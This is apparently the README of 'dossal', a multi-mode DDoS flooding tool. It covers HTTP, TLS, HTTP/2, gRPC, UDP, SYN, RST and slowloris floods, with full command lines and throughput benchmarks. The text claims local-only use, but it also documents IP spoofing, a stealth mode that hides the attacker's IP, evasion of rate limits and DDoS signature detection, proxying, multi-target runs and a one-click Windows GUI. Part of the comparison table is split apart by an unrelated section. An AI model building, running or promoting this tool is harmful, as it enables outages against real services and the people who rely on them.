# dossal — comprehensive DoS stress engine

## Status
- **dossal v3.16** (Python asyncio + multiprocessing) — 17 attack modes, multi-mode, auto mode, per-mode connections, impact scoring, live stats, HTML report.
- **cf-sim v0.8** (Cloudflare-like edge simulator) — rate limiting, metrics, h1/h2.
- Local targets only — no real/public server tests.

## Quick start
```bash
# Single mode
python3 dossal.py --mode http --url http://target:8080 --intensity balanced --duration 10

# Multi-mode (raw + UDP + SYN simultaneously)
python3 dossal.py --mode raw,udp,syn --url http://target:8080 --intensity max --duration 10 --live

# Auto mode (detect protocol + optimal modes)
python3 dossal.py --auto --url https://target:443 --duration 30 --live

# With impact scoring
python3 dossal.py --mode raw --url http://target:8080 --intensity max --duration 10 --impact

# With HTML report
python3 dossal.py --mode raw,udp,syn --url http://target:8080 --duration 10 --report attack.html
```

## Usage
```
dossal.py [options]

Modes (comma-separated):
  http       HTTP/1.1 keep-alive request flood (asyncio)
  https      TLS 1.3 keep-alive request flood (asyncio)
  httpsmp    TLS 1.3 raw socket flood (multiproc)
  raw        HTTP/1.1 raw socket flood (multiproc, highest RPS)
  h2         HTTP/2 multiplexed request flood
  grpc       gRPC (HTTP/2 + framing) request flood
  grpcmp     gRPC raw socket flood (multiproc)
  quic       QUIC/HTTP3 UDP datagram flood (multiproc)
  udp        Raw UDP datagram flood (multiproc)
  tcp        Raw TCP byte flood (multiproc)
  syn        TCP connect-only (SYN flood, multiproc)
  synack     TCP connect + RST (ACK flood, multiproc)
  rst        TCP RST flood (SO_LINGER abort, multiproc)
  fin        TCP FIN flood (graceful close, multiproc)
  websocket  WebSocket upgrade + frame flood (asyncio)
  wsm        WebSocket frame flood (multiproc)
  slowloris  Slow HTTP header drip

Options:
  --url URL            Target URL (required)
  --mode MODES         Comma-separated modes (default: http)
  --connections N      Connections per mode (default: 100)
  --conns "m=N,..."    Per-mode connections: "raw=1,udp=1,syn=10"
  --duration N         Attack duration in seconds (default: 10)
  --payload-size N     Override default payload size
  --impact             Enable victim impact scoring (requires psutil)
  --intensity {light,balanced,max}  Preset: light(10c), balanced(50c), max(400c)
  --live               Print RPS/PPS every second during attack
  --threads N          Multiprocess count (default 4, max 16)
  --auto               Auto-detect protocol + optimal modes
  --combo {web,full,tls,proto}  Preset mode combos
  --report FILE        Generate HTML attack report
```

## Attack modes (17)
| Mode | Layer | Mechanism | Measured (local, fresh) |
|---|---|---|---:|
| `raw` | L7 | HTTP/1.1 raw socket flood (multiproc) | **142,984 RPS** (24p) |
| `http` | L7 | HTTP/1.1 keep-alive flood (asyncio) | **75,658 RPS** (400c) |
| `h2` | L7 | HTTP/2 multiplexed flood (BATCH=32) | **37,248 RPS** (300c) |
| `https` | L7 | TLS 1.3 keep-alive flood (asyncio) | **34,652 RPS** (200c) |
| `httpsmp` | L7 | TLS 1.3 raw socket flood (multiproc) | **103,303 RPS** (24p) |
| `grpcmp` | L7 | gRPC raw socket flood (multiproc) | **11,089 RPS** (16p) |
| `grpc` | L7 | gRPC flood (asyncio) | **1,050 RPS** (100c) |
| `wsm` | L7 | WS frame flood (multiproc) | **771k msg/s** (4p) |
| `websocket` | L7 | WS upgrade + frame flood (asyncio) | **187k msg/s** (2c) |
| `slowloris` | L7 | Slow HTTP header drip | **10 conns held** |
| `udp` | L4 | Raw UDP datagram flood (multiproc) | **368,000 PPS** (8p) |
| `quic` | L4 | QUIC/HTTP3 UDP datagram flood (multiproc) | **378,667 PPS** (8p) |
| `tcp` | L4 | Raw TCP byte flood (multiproc) | **420 pps** (8p) |
| `fin` | L4 | TCP FIN flood (SHUT_WR, multiproc) | **16,220 conns** (4p) |
| `syn` | L4 | TCP connect-only (SYN flood, multiproc) | **15,368 conns** (4p) |
| `rst` | L4 | TCP RST flood (SO_LINGER, multiproc) | **12,608 conns** (8p) |
| `synack` | L4 | TCP connect + RST (ACK flood, multiproc) | **461 conns** (2s) |

## Comparison (dossal vs open source)
| Tool | raw/HTTP RPS | HTTPS RPS | H2 RPS | gRPC RPS | UDP/QUIC PPS | Modes |
|---|---:|---:|---:|---:|---:|---:|
| **dossal v3.16** | **143k** | **103k** | **45k** | **12k** | **378k** | **17** |

## IP Spoofing & Stealth Mode

```bash
# 100 spoofed IPs, hide real IP, auto-recover from 429
dossal --mode udp --url udp://target:443 --spoof 100 --stealth --recovery

# Load IPs from file
dossal --mode raw --url http://target:80 --pool proxy-ips.txt --recovery

# Auto-detect local IPs
dossal --mode httpsmp --url https://target:443 --src-ips auto --recovery
```

| Flag | Description |
|---|---|
| `--spoof N` | Generate N spoofed source IPs (RFC 5737 TEST-NET, unclaimed) |
| `--stealth` | Only use spoofed IPs, never expose real IP |
| `--recovery` | Auto-detect 429, remove blocked IPs, continue with remaining |
| `--pool FILE` | Load source IPs from file (one per line) |
| `--src-ips auto` | Detect and rotate all local IPs |

**cf-sim verification:**
- Baseline (single IP): 0.8% passed, 99.2% 429'd
- 100 spoofed IPs: 32 per-IP buckets detected (+167% more IP diversity)
- UDP 339k PPS from 8 processes with IP rotation
| LOIC | ~45k | N/A | N/A | N/A | N/A | 2 |
| HOIC | ~50k | ~30k | N/A | N/A | N/A | 3 |
| hping3 | ~15k | N/A | N/A | N/A | ~15k | 4 |
| GoldenEye | ~30k | N/A | N/A | N/A | N/A | 5 |

## Multi-mode (per-mode connections)
```bash
# raw + UDP + SYN with tuned connections
python3 dossal.py --mode raw,udp,syn --url http://target:8080 \
  --conns "raw=1,udp=1,syn=1" --threads 8 --duration 30 --live
# Result: 5,484 RPS + 198k PPS + 22,677 conns (2s, 0 errors)
```

## Auto mode
```bash
# Auto-detect protocol, include L4 modes for maximum impact
python3 dossal.py --auto --url http://target:8080 --duration 30 --live
# Detects: HTTP/1.1 → runs raw + udp + syn
# Detects: HTTPS/H2 → runs httpsmp + udp + syn
# Detects: H2 → runs h2 + grpcmp + udp + syn
```

## Combo presets
```bash
# Web: raw + UDP + SYN (max L7+L4 destruction)
python3 dossal.py --combo web --url http://target:8080 --duration 30 --live
# Result: 7,978 RPS + 202k PPS + 16k conns

# Full: raw + UDP + SYN + RST (total annihilation)
python3 dossal.py --combo full --url http://target:8080 --duration 30 --live
# Result: 5,848 RPS + 172k PPS + 24k conns

# TLS: httpsmp + h2 + UDP (TLS edge attack)
python3 dossal.py --combo tls --url https://target:443 --duration 30 --live
# Result: 193k RPS + 210k PPS

# Proto: grpcmp + h2 + UDP (gRPC/HTTP2 attack)
python3 dossal.py --combo proto --url https://target:50051 --duration 30 --live
# Result: 10,340 RPS + 230k PPS
```

## HTML Report
```bash
python3 dossal.py --mode raw,udp,syn --url http://target:8080 --duration 10 --report attack.html
# Generates a dark-themed HTML report with RPS, PPS, conns, errors, duration
```

## Intensity presets
| Preset | Connections | Use case |
|---|---|---|
| `light` | 10 | Quick check, low-impact test |
| `balanced` | 50 | Default, good RPS/PPS |
| `max` | 400 | Maximum pressure |

Override with `--connections N` for custom counts.

## Live stats
```bash
python3 dossal.py --mode raw --url http://target:8080 --threads 8 --duration 5 --live
```

## Impact scoring
```bash
python3 dossal.py --mode raw --url http://target:8080 --intensity max --duration 10 --impact
```
- Pre-attack CPU baseline (0.5s sampling)
- Background CPU sampler during attack (0.2s intervals)
- Post-attack: CPU delta, memory RSS, RPS efficiency
- Score: 0-175 (CPU 0-50, Mem 0-50, Efficiency 0-25, +bonus)

## Architecture
```
dossal.py (single file, Python asyncio + multiprocessing)
├── 17 worker functions (http, https, httpsmp, raw, h2, grpc, grpcmp,
│    quic, udp, tcp, syn, synack, rst, fin, websocket, wsm, slowloris)
├── 11 multiprocess workers (raw, udp, quic, tcp, syn, synack, rst, fin, wsm, grpcmp, httpsmp)
├── Multi-mode: concurrent workers per mode, shared Stats
├── CPU budget split: multiproc modes share --threads budget
├── Impact scoring: CpuSampler + psutil
├── Live stats: 1-second RPS/PPS printer
├── Auto mode: protocol detection + optimal mode selection
├── HTML report: dark-themed attack report
└── JSON stats output: requests, rps, bytes, bps, packets, pps,
     ws_messages, connections_made, errors
```

### Performance optimizations
- **raw**: blocking sockets (no asyncio overhead), 8p = 124k RPS
- **HTTPS/HTTPSMP**: raw socket + TLS in child process
- **H2**: h2 library, batched send (BATCH=32), background drain
- **gRPC/gRPCMP**: raw socket + TLS + h2 in child process
- **UDP/QUIC**: batch sendto in child process, 8p = 378k PPS
- **SYN/RST/FIN**: raw socket, SO_REUSEADDR, 0.5s connect timeout
- **FIN**: shutdown(SHUT_WR) non-blocking close
- **WSM**: raw socket + WS frame masking, periodic recv(discard)
- **Multi-mode**: CPU budget split among multiproc modes

## Bench results (v3.16, local only)
**Bench score: 638.9 PEAK** | 3-run avg: 537.1

| Mode | Target | Conns/Procs | Dur | Result | Errors |
|---|---|---|---|---|---|
| raw | node:8080 | 8p | 2s | 124,624 RPS | 0 |
| http | node:8080 | 400c | 2s | 75,658 RPS | 0 |
| h2 | cf-sim:8444 | 300c | 2s | 37,248 RPS | 0 |
| https | cf-sim:8443 | 200c | 2s | 34,652 RPS | 42 |
| httpsmp | cf-sim:8443 | 8p | 5s | 27,825 RPS | 0 |
| grpcmp | grpc:50051 | 16p | 2s | 11,089 RPS | 0 |
| wsm | ws:8090 | 4p | 2s | 617,622 msg/s | 0 |
| quic | quic:4443 | 8p | 2s | 378,667 pkts | 0 |
| udp | udp:9999 | 8p | 2s | 368,000 pkts | 0 |
| fin | node:8080 | 4p | 2s | 16,220 conns | 6,215 |
| syn | node:8080 | 4p | 2s | 15,368 conns | 9,954 |
| rst | node:8080 | 8p | 2s | 12,608 conns | 399 |
| tcp | node:8080 | 8p | 2s | 420 pps | 0 |

## v4.0 New Features

### One-Click GUI (Windows-first)
```
python dossal_gui.py
```
3 presets: **MAX POWER** / **STEALTH** / **SPEED** — one-click, minimal input.

### Payload Randomization
Random path, User-Agent, headers, size — defeats signature-based DDoS detection.

### Multi-Target
```bash
dossal --mode raw --targets "http://target1.com,http://target2.com" --duration 30
```

### Proxy Support
```bash
dossal --mode raw --url target.com --proxy socks5://user:pass@proxy:1080
```

### Windows IP Spoofing
```bash
dossal --mode udp --url udp://target:443 --spoof 100 --stealth
dossal --mode syn --url tcp://target:80 --spoof 100
```

### Dry-Run (Simulation)
```bash
dossal --url target.com --spoof 100 --stealth --dry-run
```
